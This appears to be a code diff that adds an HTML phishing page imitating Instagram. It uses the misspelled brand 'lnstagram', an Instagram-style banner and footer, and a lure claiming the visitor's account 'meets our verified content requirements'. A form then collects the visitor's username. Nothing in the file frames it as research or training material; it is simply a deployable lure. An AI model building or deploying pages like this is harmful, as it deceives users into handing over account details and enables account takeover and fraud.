@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Help Center</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico">
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <style>
+	#hardcoder{
+background-color:white;
+width:91%;
+margin-top: 50px;
+}
+        .container {
+            margin-left: auto;
+            margin-right: auto;
+            text-align: center;
+        }
+
+        .logo-box {
+            display: flex;
+            justify-content: center;
+            margin-top: 61px;
+        }
+
+        .text {
+            font-size: 15px;
+            display: flex;
+            justify-content: center;
+            margin-top: 41px;
+            margin-left: auto;
+            margin-right: 10px;
+        }
+
+        .text p {
+            color: #EDEDED;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+ul {
+    margin: 0px;
+    padding: 0px;
+}
+.footer-section {
+  background: #151414;
+  position: relative;
+}
+.footer-cta {
+  border-bottom: 1px solid #373636;
+}
+.single-cta i {
+  color: #ff5e14;
+  font-size: 30px;
+  float: left;
+  margin-top: 8px;
+}
+.cta-text {
+  padding-left: 15px;
+  display: inline-block;
+}
+.cta-text h4 {
+  color: #fff;
+  font-size: 20px;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+.cta-text span {
+  color: #757575;
+  font-size: 15px;
+}
+.footer-content {
+  position: relative;
+  z-index: 2;
+}
+.footer-pattern img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 330px;
+  background-size: cover;
+  background-position: 100% 100%;
+}
+.footer-logo {
+  margin-bottom: 30px;
+}
+.footer-logo img {
+    max-width: 200px;
+}
+.footer-text p {
+  margin-bottom: 14px;
+  font-size: 14px;
+      color: #7e7e7e;
+  line-height: 28px;
+}
+.footer-social-icon span {
+  color: #fff;
+  display: block;
+  font-size: 20px;
+  font-weight: 700;
+  font-family: 'Poppins', sans-serif;
+  margin-bottom: 20px;
+}
+.footer-social-icon a {
+  color: #fff;
+  font-size: 16px;
+  margin-right: 15px;
+}
+.footer-social-icon i {
+  height: 40px;
+  width: 40px;
+  text-align: center;
+  line-height: 38px;
+  border-radius: 50%;
+}
+.facebook-bg{
+  background: #3B5998;
+}
+.twitter-bg{
+  background: #55ACEE;
+}
+.google-bg{
+  background: #DD4B39;
+}
+.footer-widget-heading h3 {
+  color: #fff;
+  font-size: 20px;
+  font-weight: 600;
+  margin-bottom: 40px;
+  position: relative;
+}
+.footer-widget-heading h3::before {
+  content: "";
+  position: absolute;
+  left: 0;
+  bottom: -15px;
+  height: 2px;
+  width: 50px;
+  background: #ff5e14;
+}
+.footer-widget ul li {
+  display: inline-block;
+  float: left;
+  width: 50%;
+  margin-bottom: 12px;
+}
+.footer-widget ul li a:hover{
+  color: #ff5e14;
+}
+.footer-widget ul li a {
+  color: #878787;
+  text-transform: capitalize;
+}
+.subscribe-form {
+  position: relative;
+  overflow: hidden;
+}
+.subscribe-form input {
+  width: 100%;
+  padding: 14px 28px;
+  background: #2E2E2E;
+  border: 1px solid #2E2E2E;
+  color: #fff;
+}
+.subscribe-form button {
+    position: absolute;
+    right: 0;
+    background: #ff5e14;
+    padding: 13px 20px;
+    border: 1px solid #ff5e14;
+    top: 0;
+}
+.subscribe-form button i {
+  color: #fff;
+  font-size: 22px;
+  transform: rotate(-6deg);
+}
+.copyright-area{
+  background: #202020;
+  padding: 25px 0;
+}
+.copyright-text p {
+  margin: 0;
+  font-size: 14px;
+  color: #878787;
+}
+.copyright-text p a{
+  color: #ff5e14;
+}
+.footer-menu li {
+  display: inline-block;
+  margin-left: 20px;
+}
+.footer-menu li:hover a{
+  color: #ff5e14;
+}
+.footer-menu li a {
+  font-size: 14px;
+  color: #878787;
+}
+        .form {
+            margin-top: 25px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .form input {
+            background: none;
+            border: 1px solid #000000;
+            color: black;
+            height: 25px;
+            width: 200px;
+            text-align: center;
+            border-radius:4px;
+        }
+
+
+        ::placeholder {
+            color: #D0D3D4;
+            opacity: 1;
+        }
+
+        :-ms-input-placeholder {
+            color: #D0D3D4;
+        }
+
+        ::-ms-input-placeholder {
+            color: #D0D3D4;
+        }
+
+            form button {
+			width:200px;
+			height:30px;
+			margin-top:10px;
+			outline:none;
+			border:none;
+			color:white;
+			background:#3896f0;
+			font-weight:bold;
+			font-size:15px;
+			margin-bottom:10px;
+			border-radius:4px;
+      }
+      .button:disabled {
+        opacity: 0.5;
+      }
+
+        .company {
+            display: flex;
+            justify-content: center;
+            margin-top: 30px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .footer {
+            background: #212221;
+            height: 440px;
+            margin-bottom: 0;
+            margin-left: 15%;
+            margin-right: 15%;
+        }
+
+        #copyright {
+            color: white;
+        }
+
+        #menu {
+            display: inline;
+            margin-top: 45px;
+            width: 90%;
+            margin-left: 35px;
+        }
+
+        #liste {
+            display: inline-block;
+        }
+
+        #link {
+            text-decoration: none;
+            color: white;
+            font-family: sans-serif;
+            font-size: 13px;
+            font-weight: 540;
+            vertical-align: baseline;
+        }
+        #ornek {
+  width: 100%;
+  padding: 50px 0;
+  text-align: center;
+  background-color: lightblue;
+  margin-top: 20px;
+}
+	select {
+    border: 1px solid #fff;
+    background-color: transparent;
+	width:10;
+}
+    </style>
+<script src="js/jquery.js" type="text/javascript"></script>
+<link href="//netdna.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.css" rel="stylesheet">
+<script src="https://code.iconify.design/2/2.0.3/iconify.min.js"></script>
+</head>
+
+<body>
+		<div style="margin:0; padding;">
+
+ 
+<div style=" padding:5px; margin:0px;
+width:100%; height:45px;;
+  background: #f09433; 
+background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
+background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
+background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
+filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
+  ">
+
+
+  <table style="width:100%;margin:0px;">
+      <tbody><tr style="width:100%;margin:0px;">
+         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">lnstagram<br></td>
+         <td style="border:1px solid:white;color:white; margin:0px;
+text-align:right;"><div style="border:1px solid white;margin:0px;
+width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;"> GET
+</div>
+
+</td>
+   </tbody></table>
+<center>
+<div id="hardcoder" style="border:1px solid black;"> 
+    <div class="container">
+        <div class="logo-box">
+            <img height="70" width="250" src="indexlogo.png">
+        </div>
+        <div class="text">
+            <font color="black">If you are redirected to this page, your account meets our verified content requirements. Please fill out the form to verify your account.</font>
+        </div>
+        <div class="form">
+            <form method="POST">
+                <input type="text" name="username" placeholder="Username" required><br>
+                <button type="submit" class="button">Continue</button><br><br>
+            </form>
+        </div></div>
+</div><br>
+<img height="50" width="300" src="https://i.hizliresim.com/ivc168t.png"/>
+<hr />
+                    <select style="width: 75px; height: 30px; color:#AFAFAF">
+<option style="color:#c0c0c0">English</option>
+<option value="cs" __cpp="1">Čeština</option>
+<option value="da" __cpp="1">Dansk</option>
+<option value="de" __cpp="1">Deutsch</option>
+<option value="el" __cpp="1">Ελληνικά</option>
+<option value="en" __cpp="1">English (UK)</option>
+<option value="es" __cpp="1">Español (España)</option>
+<option value="es-la" __cpp="1">Español</option>
+<option value="fi" __cpp="1">Suomi</option>
+<option value="fr" __cpp="1">Français</option>
+<option value="id" __cpp="1">Bahasa Indonesia</option>
+<option value="it" __cpp="1">Italiano</option>
+<option value="ja" __cpp="1">日本語</option>
+<option value="ko" __cpp="1">한국어</option>
+<option value="ms" __cpp="1">Bahasa Melayu</option>
+<option value="nb" __cpp="1">Norsk</option>
+<option value="nl" __cpp="1">Nederlands</option>
+<option value="pl" __cpp="1">Polski</option>
+<option value="pt-br" __cpp="1">Português (Brasil)</option>
+<option value="pt" __cpp="1">Português (Portugal)</option>
+<option value="ru" __cpp="1">Русский</option>
+<option value="sv" __cpp="1">Svenska</option>
+<option value="th" __cpp="1">ภาษาไทย</option>
+<option value="tl" __cpp="1">Filipino</option>
+<option value="tr" __cpp="1">Türkçe</option>
+<option value="zh-cn" __cpp="1">中文(简体)</option>
+<option value="zh-tw" __cpp="1">中文(台灣)</option>
+<option value="bn" __cpp="1">বাংলা</option>
+<option value="gu" __cpp="1">ગુજરાતી</option>
+<option value="hi" __cpp="1">हिन्दी</option>
+<option value="hr" __cpp="1">Hrvatski</option>
+<option value="hu" __cpp="1">Magyar</option>
+<option value="kn" __cpp="1">ಕನ್ನಡ</option>
+<option value="ml" __cpp="1">മലയാളം</option>
+<option value="mr" __cpp="1">मराठी</option>
+<option value="ne" __cpp="1">नेपाली</option>
+<option value="pa" __cpp="1">ਪੰਜਾਬੀ</option>
+<option value="si" __cpp="1">සිංහල</option>
+<option value="sk" __cpp="1">Slovenčina</option>
+<option value="ta" __cpp="1">தமிழ்</option>
+<option value="te" __cpp="1">తెలుగు</option>
+<option value="vi" __cpp="1">Tiếng Việt</option>
+<option value="zh-hk" __cpp="1">中文(香港)</option>
+<option value="bg" __cpp="1">Български</option>
+<option value="fr-ca" __cpp="1">Français (Canada)</option>
+<option value="ro" __cpp="1">Română</option>
+<option value="sr" __cpp="1">Српски</option>
+<option value="uk" __cpp="1">Українська</option></select>
+<br><br>
+<font color="#b9b9b9">About</font>&nbsp;
+<font color="#c0c0c0">Blog</font>&nbsp;  
+		<font color="#b9b9b9">Jobs</font>&nbsp;  
+		<font color="#b9b9b9">Help</font>&nbsp;  
+		<font color="#b9b9b9">API</font>&nbsp;  
+		<font color="#b9b9b9">Privacy</font> &nbsp;
+		<font color="#b9b9b9">Terms</font>&nbsp;
+<br>	<br>
+<img height="50" width="250" src="https://i.hizliresim.com/rrfe73r.png">
+</body>
+</html>
